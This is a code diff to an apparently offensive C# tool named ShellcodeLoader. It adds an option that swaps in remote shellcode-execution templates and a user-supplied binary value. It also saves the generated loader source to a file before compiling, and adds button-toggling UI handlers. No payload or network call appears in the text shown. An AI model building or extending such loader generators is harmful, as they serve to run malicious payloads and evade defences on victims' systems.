@@ -275,6 +275,24 @@ namespace ShellcodeLoader
                     sourceCode = sourceCode.Replace("{{CheckDisk_Here}}", "");
                 }
 
+                if (checkBox8.Checked)
+                {
+                    sourceCode = sourceCode.Replace("{{Execute_Shellcode}}", ReadFile("Template\\Remote.tpl"));
+                    sourceCode = sourceCode.Replace("{{Execute_Shellcode_Method}}", ReadFile("Template\\RemoteMethod.tpl"));
+                    sourceCode = sourceCode.Replace("{{binary}}", textBox1.Text);
+                }
+                else
+                {
+                    sourceCode = sourceCode.Replace("{{Execute_Shellcode}}", ReadFile("Template\\Local.tpl"));
+                    sourceCode = sourceCode.Replace("{{Execute_Shellcode_Method}}", ReadFile("Template\\LocalMethod.tpl"));
+                }
+
+                using (StreamWriter sw = new StreamWriter("code.txt"))
+                {
+                    sw.Write(sourceCode);
+                    sw.Close();
+                }
+
                 CompilerResults cr = provider.CompileAssemblyFromSource(parameters, sourceCode);
                 if (cr.Errors.Count > 0)
                 {
@@ -302,6 +320,35 @@ namespace ShellcodeLoader
         private void button2_Click(object sender, EventArgs e)
         {
             CompileCode(64, bobPrivateKey, OpenFile());
+        }
+
+        private void checkBox8_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBox8.Checked)
+            {
+                button2.Enabled = false;
+            }
+            else
+            {
+                button2.Enabled = true;
+            }
+        }
+
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+            if (textBox1.Text.Length <= 0)
+            {
+                button1.Enabled = false;
+                button2.Enabled = false;
+            }
+            else
+            {
+                if (!checkBox8.Checked)
+                {
+                    button2.Enabled = true;
+                }
+                button1.Enabled = true;
+            }
         }
     }
 }
